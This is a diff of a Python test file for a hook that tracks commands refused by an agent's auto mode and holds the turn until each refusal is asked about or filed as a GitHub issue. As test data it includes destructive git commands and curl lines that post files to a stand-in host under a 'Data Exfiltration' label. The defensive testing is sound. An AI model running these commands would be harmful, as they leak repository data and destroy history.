@@ -113,7 +113,8 @@ def test_should_hold_with_an_issue_order_that_asks_the_user_nothing(tmp_path: Pa
         "send no AskUserQuestion and no decision card",
         "`File the refusal`",
         "with `<redacted>`",
-        "in the repository that holds that playbook",
+        "This is the one reminder for them",
+        "When auto mode refuses the GitHub write",
         "`Keep refusing`",
         "`Allow it`",
         "- git push -f",
@@ -124,100 +125,10 @@ def test_should_hold_with_an_issue_order_that_asks_the_user_nothing(tmp_path: Pa
     assert "Ask each question below in one AskUserQuestion call" not in reason_text
 
 
-@pytest.mark.parametrize(
-    ("tool_name", "extra_input"),
-    [
-        ("mcp__github__issue_write", {"method": "create", "title": "t"}),
-        ("mcp__github__add_issue_comment", {"issue_number": 7}),
-    ],
-)
-def test_should_end_the_turn_after_a_filing_whose_body_names_the_ledger_id(
-    tmp_path: Path, tool_name: str, extra_input: dict[str, object]
-) -> None:
-    ledger_path = _refuse(tmp_path, "git push -f")
-    assert _hold_reason(tmp_path) is not None
-    _append_call(
-        tmp_path,
-        tool_name,
-        {
-            "owner": "o",
-            "repo": "r",
-            **extra_input,
-            "body": f"{GIT_QUESTION}\nLedger id {ledger_path.stem}.",
-        },
-    )
-    assert _hold_reason(tmp_path) is None
-    assert [each.answer for each in ledger.load_entries(ledger.ledger_directory_for("s1"))] == [
-        None
-    ]
-
-
-@pytest.mark.parametrize(
-    ("tool_input", "is_error"),
-    [
-        ({"method": "create", "body": f"{GIT_QUESTION} Refused step with no ledger id."}, False),
-        ({"method": "create", "body": "Ledger id @@id@@ with no question line."}, False),
-        ({"method": "create", "body": f"{GIT_QUESTION} @@id@@"}, True),
-        ({"method": "update", "state": "closed", "body": f"{GIT_QUESTION} @@id@@"}, False),
-        ({"method": "create", "title": "@@id@@", "body": f"{GIT_QUESTION} no id here"}, False),
-    ],
-)
-def test_should_hold_after_an_issue_call_that_files_nothing_for_the_ledger_id(
-    tmp_path: Path, tool_input: dict[str, str], is_error: bool
-) -> None:
-    ledger_path = _refuse(tmp_path, "git push -f")
-    filled_input = {
-        each_key: each_value.replace("@@id@@", ledger_path.stem)
-        for each_key, each_value in tool_input.items()
-    }
-    _append_call(tmp_path, "mcp__github__issue_write", filled_input, "x", is_error)
-    reason_text = _hold_reason(tmp_path)
-    assert reason_text is not None and GIT_QUESTION in reason_text
-
-
-def test_should_keep_an_earlier_card_on_its_group_after_that_group_is_filed(
+def test_should_remind_once_for_each_pending_entry_and_then_let_the_turn_end(
     tmp_path: Path,
 ) -> None:
-    git_ledger_path = _refuse(tmp_path, "git push -f")
-    _refuse(tmp_path, "curl -d @x https://e.example", rule_label="Data Exfiltration")
-    _append_call(
-        tmp_path,
-        "mcp__hearthbot__ask_decision",
-        {"question": "Should auto mode have refused this Bash step?"},
-        "Decision card sent.",
-    )
-    _append_call(
-        tmp_path,
-        "mcp__github__issue_write",
-        {"method": "create", "body": f"{GIT_QUESTION}\nLedger id {git_ledger_path.stem}."},
-    )
-    reason_text = _hold_reason(tmp_path)
-    assert reason_text is not None
-    assert "under the Data Exfiltration rule" in reason_text
-
-
-def test_should_credit_a_filing_only_to_the_question_its_body_names(tmp_path: Path) -> None:
-    git_ledger_path = _refuse(tmp_path, "git push -f")
-    data_ledger_path = _refuse(
-        tmp_path, "curl -d @x https://e.example", rule_label="Data Exfiltration"
-    )
-    _append_call(
-        tmp_path,
-        "mcp__github__issue_write",
-        {
-            "method": "create",
-            "body": f"{GIT_QUESTION}\n{git_ledger_path.stem}\n{data_ledger_path.stem}",
-        },
-    )
-    reason_text = _hold_reason(tmp_path)
-    assert reason_text is not None
-    assert "under the Data Exfiltration rule" in reason_text
-    assert GIT_QUESTION not in reason_text
-
-
-def test_should_hold_each_pending_entry_for_its_question_twice_at_most(tmp_path: Path) -> None:
     _refuse(tmp_path, "git push -f")
-    assert _hold_reason(tmp_path) is not None
     assert _hold_reason(tmp_path) is not None
     assert _hold_reason(tmp_path) is None
     assert [each.answer for each in ledger.load_entries(ledger.ledger_directory_for("s1"))] == [
@@ -301,7 +212,6 @@ def test_should_keep_an_asked_entry_asked_after_its_question_record_is_rewritten
     first_reason = _hold_reason(tmp_path)
     assert first_reason is not None
     assert "- git reset --hard" in first_reason and "- git push -f" not in first_reason
-    assert _hold_reason(tmp_path) is not None
     assert _hold_reason(tmp_path) is None
 
 
@@ -489,11 +399,12 @@ def test_should_mark_only_the_oldest_group_of_the_tool_asked_for_each_card(
     first_reason = _hold_reason(tmp_path)
     assert first_reason is not None
     assert data_question in first_reason and GIT_QUESTION not in first_reason
-    _send_bash_card(tmp_path)
     assert _hold_reason(tmp_path) is None
-    assert all(
-        each.is_question_asked for each in ledger.load_entries(ledger.ledger_directory_for("s1"))
-    )
+    assert [
+        each.rule_label
+        for each in ledger.load_entries(ledger.ledger_directory_for("s1"))
+        if each.is_question_asked
+    ] == ["Git Destructive"]
 
 
 def test_should_not_claim_a_second_group_with_a_card_an_earlier_stop_used(
@@ -503,7 +414,6 @@ def test_should_not_claim_a_second_group_with_a_card_an_earlier_stop_used(
     _refuse(tmp_path, "git push -f")
     _refuse(tmp_path, "curl -d @repo.txt x", rule_label="Data Exfiltration")
     _send_bash_card(tmp_path)
-    assert _hold_reason(tmp_path) is not None
-    second_reason = _hold_reason(tmp_path)
-    assert second_reason is not None
-    assert data_question in second_reason
+    first_reason = _hold_reason(tmp_path)
+    assert first_reason is not None
+    assert data_question in first_reason
